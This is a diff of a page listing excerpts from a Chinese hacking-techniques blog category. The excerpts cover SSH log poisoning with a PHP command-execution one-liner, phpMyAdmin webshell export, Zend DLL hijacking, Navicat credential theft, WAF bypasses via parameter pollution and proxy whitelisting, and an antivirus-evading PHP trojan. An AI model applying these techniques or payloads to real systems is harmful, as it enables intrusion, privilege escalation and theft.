@@ -45,33 +45,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-08T07:19:57.000Z" itemprop="datePublished">
-          2012-07-08
+      <time datetime="2013-06-01T08:59:02.000Z" itemprop="datePublished">
+          2013-06-01
       </time>
     
     
     | 
-    <a href='/tag/一句话/'>一句话</a>,
-    
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/phpmyadmin/'>phpmyadmin</a>,
-    
-    <a href='/tag/突破/'>突破</a>
+    <a href='/tag/Webshell/'>Webshell</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/662.seo/">phpmyadmin导出一句话时，路径为中文的突破方法</a></h2>
+      <h2 class="post-title"><a href="/1003.seo/">TNTHK小组内部版webshell密码破解解析</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        摘自t00ls.net   执行如下SQL语句后导出文件即可   set character_set_client=’gbk’;    set character_set_connection=’gbk’;    set character_set_database=’gbk’;    set character_set_results=’gbk’;    set character_set_server=’gbk’;    selec
+        下面简单的揭露下怎么获取webshell后门密码    1. 在password登陆框 随便输入一错误密码，提示error，如图：        2. 然后右键查看源文件，搜索[password]，font 后面跟的就是shell的密码，测试一下    3. 按照上面的方法，貌似通杀…  
       
       </p>
       
       <p>
-          <a href="/662.seo/" class="excerpt-link">Read More...</a>
+          <a href="/1003.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -80,32 +74,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-02T09:39:36.000Z" itemprop="datePublished">
-          2012-07-02
+      <time datetime="2013-04-16T08:04:48.000Z" itemprop="datePublished">
+          2013-04-16
       </time>
     
     
     | 
-    <a href='/tag/ssh/'>ssh</a>,
-    
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/包含漏洞/'>包含漏洞</a>
+    <a href='/tag/安全狗/'>安全狗</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/622.seo/">利用SSH来包含执行命令</a></h2>
+      <h2 class="post-title"><a href="/991.seo/">利用Google GAE 突破网站安全狗</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>转自<a href="http://www.ayhacker.net/ayblog/read.php?173">http://www.ayhacker.net/ayblog/read.php?173</a></p>
-<p>文章的总体思路就是：<br>使用<br>ssh ‘&lt;pre&gt;&lt;?echo system($_GET[‘cmd’]); exit;?&gt;’@10.10.11.33登入，然后会在<a href="http://ha.cker.in/tag/ssh" target="_blank">ssh</a>的登入日志里记录，再让存在<a href="http://ha.cker.in/tag/包含漏洞" target="_blank">包含漏洞</a>php去包含错误日志文件来达到目的。<br>包含正常的日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image001" src="http://img.cker.in/SSH_C60/clip_image001.png" alt="clip_image001" width="819" height="322" border="0" /><br>使用特定的一句话木马作为帐号登入，产生含有一句话的日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image002" src="http://img.cker.in/SSH_C60/clip_image002.png" alt="clip_image002" width="635" height="87" border="0" /><br>再次包含日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image003" src="http://img.cker.in/SSH_C60/clip_image003.png" alt="clip_image003" width="1171" height="208" border="0" /><br>成功执行</p>
+        看到一个过狗的方法，被狗咬的同学可以试试。  谢谢花七七同学的刻苦钻研：http://www.hqqblog.com/break-through-the-safedog/  被咬前：    见证奇迹的时候：    方法和原理：方法很简单，只要使用最平常不过的：通过GoAgent代理即可（其他基于GAE爬墙的软件都可以）。至于怎么使用GoAgent我想应该不用我多说了吧……原理更简单，在默认规则里面安全狗把Google的IP全添加进白名单
       
       </p>
       
       <p>
-          <a href="/622.seo/" class="excerpt-link">Read More...</a>
+          <a href="/991.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -114,29 +103,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-02T07:59:05.000Z" itemprop="datePublished">
-          2012-07-02
+      <time datetime="2013-03-27T06:49:01.000Z" itemprop="datePublished">
+          2013-03-27
       </time>
     
     
     | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/post/'>post</a>
+    <a href='/tag/社会工程学/'>社会工程学</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/619.seo/">淘宝网某处存在严重支付漏洞</a></h2>
+      <h2 class="post-title"><a href="/982.seo/">社会工程学之诱饵攻击真实案列</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>转自乌云<a href="http://www.wooyun.org/bugs/wooyun-2010-07293">http://www.wooyun.org/bugs/wooyun-2010-07293</a></p>  <p>漏洞详情</p>  <p>披露状态：</p>  <p>2012-05-18： 细节已通知厂商并且等待厂商处理中   <br />2012-05-18： 厂商已经确认，细节仅向厂商公开    <br />2012-05-28： 细节向核心白帽子及相关领域专家公开    <br />2012-06-07： 细节向普通白帽子公开    <br />2012-06-17： 细节向实习白帽子公开    <br />2012-07-02： 细节向公众公开</p>  <p>简要描述：</p>  <p>淘宝网某处存在支付漏洞，未使用SSL加密支付过程，同时，对支付过程相关代码的审计存在一定缺陷，导致漏洞产生。会导致允许用户对支付金额进行修改，给厂商带来很大的利益损失。</p>  <p>详细说明：</p>  <p>在阿里旺旺2012中，使用短信旺旺中心对短信条数进行充值，在该过程中，未使用SSL安全连接，同时存在支付漏洞。   <br />选择充值的金额后，下一步，使用<a href="http://ha.cker.in/tag/Fiddler" target="_blank">Fiddler</a>截取数据包，GBK编码，修改POST数据中的数据，seriesPrice为支付的金额，seriesNum为充值的条数，这两个地方理论上都可以进行修改，这里以修改seriesPrice为例。</p>  <p>漏洞证明：</p>  <p>充值前截图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/bdc6a26da239_15137/clip_image001.jpg" width="532" height="443" /></p>
+        近日，安全公司Trustwave的SpiderLabs实验室做了一系列社会工程学的实验，使用了社工种经典的手法，证明这些手法仍然非常有效，利用人的好奇心获得了需要的信息。  详细过程：  首先SpiderLabs收集了目标公司员工名单信息，包含姓名、住址等，然后决定使用让用户更新自己的杀毒软件的方法进行攻击。  SpiderLabs提供了一个社工中攻击的经典模板，并与U盘或CD光盘一起寄送给目标用户，模板内容如下：  亲爱的员工XX（直
       
       </p>
       
       <p>
-          <a href="/619.seo/" class="excerpt-link">Read More...</a>
+          <a href="/982.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -145,29 +132,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-02T06:06:45.000Z" itemprop="datePublished">
-          2012-07-02
+      <time datetime="2013-03-11T17:22:13.000Z" itemprop="datePublished">
+          2013-03-12
       </time>
     
     
     | 
-    <a href='/tag/拿shell/'>拿shell</a>,
-    
-    <a href='/tag/突破星外/'>突破星外</a>
+    <a href='/tag/WAF/'>WAF</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/616.seo/">关于后台只读备份拿shell</a></h2>
+      <h2 class="post-title"><a href="/978.seo/">Bypassing WAF via HTTP Parameter Pollution</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>今天在旁注一个站点的过程中遇到了一个十分有意思的站,拿出来跟大家分享下.&#160; 小菜文章没技术含量大牛路过    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; margin-left: 0px; border-top: 0px; margin-right: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/shell_14827/clip_image001.jpg" width="590" height="364" />这是这个站的后台用 账号admin密码admin进去以后发现里面是精良的框架搭建的</p>
+        <p>Last week I was invited to join a team to participate in a CTF (Capture The Flag) contest organized by <a href="https://csawctf.poly.edu/">CSAW</a> Team.</p>  <p>   <br />With my wife and kids around, I only had the opportunity to pick one challenge related to Web Exploitation named: &quot;HorceForce&quot; worth 300 points! Basically, you were provided with a low-privilege account and needed to find your way to get Administrator access.</p>  <p>   <br />So, there are multiple resources explaining how to exploit it, but definitely I want to share my experience.</p>  <p>   <br />After sending some single quotes it was easy to find a SQL Injection bug by getting the well known &quot;MySQL SQL Error Message&quot;.</p>  <p>   <br />So, as you all know the first attempt was something like:</p>  <p>   <br /><font color="#00ff40"><a href="http://128.238.66.217/horse.php?id=7">http://128.238.66.217/horse.php?id=7</a> or 1 IN (select current_user)</font></p>  <p>   <br />And I got I ERROR Message saying something like &quot;PLEASE STOP trying to hack this blablablabla site&quot;.</p>  <p>   <br />Then after many techniques to bypass the filter I realized the <a href="http://ha.cker.in/tag/WAF" target="_blank">WAF</a> was configured to deny any string containing either &quot;select&quot; or &quot;union&quot;, blindly I assumed the WAF’s regular expression was something like:</p>  <p>   <br />/^.<em>select.</em>$/ or /^.<em>union.</em>$/ </p>  <p>   <br />Which means, every string which even makes no sense from SQLi point of view like: <font color="#00ff00">blablaSELECTblabla</font> or a bypass technique like: <font color="#00ff00">/<em>!union</em>/</font> , were triggering the Warning Message.</p>  <p>   <br />After some research I found the <a href="http://www.acunetix.com/blog/whitepaper-http-parameter-pollution/">HTTP Pollution</a> technique which basically allows the attacker (among other things) to play with the GET Parameters in order to confuse the WAF filter.</p>  <p>   <br />So, how it works?</p>  <p>   <br />Let’s say you have the GET parameter &quot;id&quot;, you can duplicate it (or even add it many times) and send something like:</p>  <p>   <br /><font color="#00ff00">?id=value1&amp;id=value2</font></p>  <p>   <br />And, depending on the Framework used (PHP, Java, ASP.NET, etc) the parameters are going to be parsed differently, in our case with Apache/PHP, if you inject the same parameter multiple times, only the last one will be parsed by the Framework (see table below) but guess what? Only the first parameter is going to be analyzed by the WAF!</p>  <p>   <br />This means, by injecting: ?id=7&amp;id=[SQLi]</p>  <p>   <br />WAF Network Layer parses&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; id=7&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;- Good to go!     <br />PHP Application Layer parses&#160;&#160;&#160;&#160;&#160;&#160; id=[SQLi]&#160;&#160;&#160;&#160; &lt;- SQLi successfully injected</p>  <p>   <br />So, this is a typical example where you can inject something that is going to be treated differently at Network Layer and Application Layer.</p>  <p>   <br />Below is a table where you can find how other Frameworks react when receiving the same parameter multiple times. Like ASP.NET, if it receives two parameters, it will concatenate them, and therefore you can split the attack into those fields to bypass the WAF, which is out of scope of this blog.</p>  <p><a href="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image001.jpg"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image001_thumb.jpg" width="1284" height="740" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/616.seo/" class="excerpt-link">Read More...</a>
+          <a href="/978.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -176,29 +161,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-25T08:32:36.000Z" itemprop="datePublished">
-          2012-06-25
+      <time datetime="2013-03-03T20:41:15.000Z" itemprop="datePublished">
+          2013-03-04
       </time>
     
     
     | 
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/Zend/'>Zend</a>
+    <a href='/tag/FLASH游戏/'>FLASH游戏</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/606.seo/">通过Zend目录权限不严获取执行权限</a></h2>
+      <h2 class="post-title"><a href="/976.seo/">针对QQ空间游戏-猜歌王的辅助研究</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>服务器上很多都装了 Zend   <br />就算 C:\Program Files\ 设置过权限，安装Zend后，Zend 会自动配置目录的权限    <br />C:\Program Files\Zend\ZendOptimizer-3.3.0\ 下的目录权限为 Everyone 全权,这导致入侵者能写入文件。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Zend_78D/clip_image001.jpg" width="615" height="607" />    <br />如果黑客入侵一个服务器，只支持 asp,或php,没有执行权限，执行组件也给禁用了，只有读写文件的权限(只要读写权限就够)。    <br />但 C:\Program Files\Zend\ZendOptimizer-3.3.0\lib 下有 ZendExtensionManager.dll 文件，    <br />而这个文件就算加载了，也能通过&quot;重命名&quot;得以修改。    <br />而黑客只要把这个DLL换成黑客的DLL，将能加载起来！    <br />在测试中发现，如果直接换上DLL，替换的DLL不能被Zend加载！    <br />转换思路，软件应该是加载相关DLL再查看相关接口!&#160;&#160; <br />Zend 加载 -&gt; 替换后的dll(文件名用 ZendExtensionManager.dll ) -&gt; 加载原DLL (这是原文件，把他改为名 ZendExtensionManager.dll.log 让自己的加载他)    <br />测试能成功加载！</p>
+         元旦期间舍友迷恋上了QQ空间的一个游戏应用-猜歌王，玩得不亦乐乎。突然有一次，上铺告诉遇到一个人，猜歌都特别快，特别准，很明显用了外挂。    上面是背景。     对于这个游戏我的第一思路是模拟，对声音进行采样，提取特征，然后与歌曲库中歌曲对比，理论上是可行的，比如有一款APP叫做SoundHound……但是游戏辅助必然不是通过这种手段。     换个思路，根据经验，歌曲片段应该需要先缓存到本地，于是考虑拦截HTTP封包，对比歌曲库
       
       </p>
       
       <p>
-          <a href="/606.seo/" class="excerpt-link">Read More...</a>
+          <a href="/976.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -207,27 +190,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-21T15:10:35.000Z" itemprop="datePublished">
-          2012-06-21
+      <time datetime="2012-12-24T16:31:00.000Z" itemprop="datePublished">
+          2012-12-25
       </time>
     
     
     | 
-    <a href='/tag/利用navicat提权/'>利用navicat提权</a>
+    <a href='/tag/免杀/'>免杀</a>,
+    
+    <a href='/tag/木马/'>木马</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/587.seo/">利用navicat提权</a></h2>
+      <h2 class="post-title"><a href="/959.seo/">利用重复参数数组变量构造php免杀木马</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        navicat是一个比较流行的MySQL管理工具，在很多服务器上都可以找到   有两个方法提权：   1、从日志文件里找密码，navicat会把操作日志（比如加账户）保存到My Documents\Navicat\MySQL\logs下的LogHistory.txt，低版本是安装目录下的logs下LogHistory.txt   2、navicat管理的MySQL服务器信息（一般是root帐户）是存在注册表里的，具体是HKEY_CURR
+        最近发现php一个很2b的字符串构造数组的方法：     &lt;?php     $str = &quot;a[]=1&amp;a[]=2&amp;b[]=3&quot;;     parse_str($str, $arr);     print_r($arr);     ?&gt;  &#160;  以上代码返回结果为：    Array ( [a] =&gt; Array ( [0] =&gt; 1 [1] =&gt; 2 ) [
       
       </p>
       
       <p>
-          <a href="/587.seo/" class="excerpt-link">Read More...</a>
+          <a href="/959.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -235,7 +220,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/category/黑客技巧/page/4/">← Newer Posts</a>
-    <span class="page-number">Page 5 of 10</span>
+    <span class="page-number">Page 5 of 13</span>
     <a class="older-posts" href="/category/黑客技巧/page/6/">Older Posts →</a>
   </nav>
 </main>
